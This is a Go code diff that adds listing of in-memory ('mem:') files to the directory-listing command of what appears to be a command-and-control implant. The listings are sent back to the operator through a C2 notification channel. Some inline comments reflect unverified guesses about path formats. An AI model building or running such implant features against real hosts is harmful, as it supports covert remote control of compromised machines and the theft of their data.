@@ -36,6 +36,62 @@ func runListDir(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error: args error\n")
 		return
 	}
+
+	// Helper to format memory file entries
+	listMemFiles := func() {
+		files := util.ListMemFiles()
+		if len(files) == 0 {
+			c2transport.NotifyC2(cmd, "")
+			return
+		}
+
+		// Determine prefix to strip
+		// We want to list files relative to 'path'
+		// If path is "mem:", "mem:/", treat as "mem://" base
+		prefix := path
+		if !strings.HasSuffix(prefix, "/") {
+			prefix += "/"
+		}
+		// Normalize "mem:/" to "mem:///" because keys are likely "mem:///file"
+		if prefix == "mem:/" {
+			prefix = "mem:///"
+		} else if prefix == "mem://" { // explicit mem://
+			prefix = "mem:///" // keys have 3 slashes usually? Let's check keys.
+			// Users write mem:///file. So yes.
+		}
+
+		var out []string
+		// Prepend CWD line. Use the original path or normalized?
+		// listRemoteDir discards it, but it helps debugging.
+		out = append(out, path)
+
+		for _, f := range files {
+			// Check if file is "inside" the filtered path
+			// Note: strict prefix match might filter out "mem:///file" if path is "mem:" (prefix "mem:/")
+			// We need to be flexible.
+
+			var rel string
+			if strings.HasPrefix(f, prefix) {
+				rel = strings.TrimPrefix(f, prefix)
+			} else if strings.HasPrefix(f, "mem://") && (path == "mem:" || path == "mem:/") {
+				// Special case for root list
+				rel = strings.TrimPrefix(f, "mem://") // removes scheme, leaves /file
+				rel = strings.TrimPrefix(rel, "/")    // leaves file
+			}
+
+			if rel != "" {
+				out = append(out, rel)
+			}
+		}
+		c2transport.NotifyC2(cmd, "%s", strings.Join(out, "\n"))
+	}
+
+	// Check for memory path
+	if strings.HasPrefix(path, "mem:") { // match mem:, mem:/, mem://
+		listMemFiles()
+		return
+	}
+
 	var listPath string
 	switch path {
 	case ".":
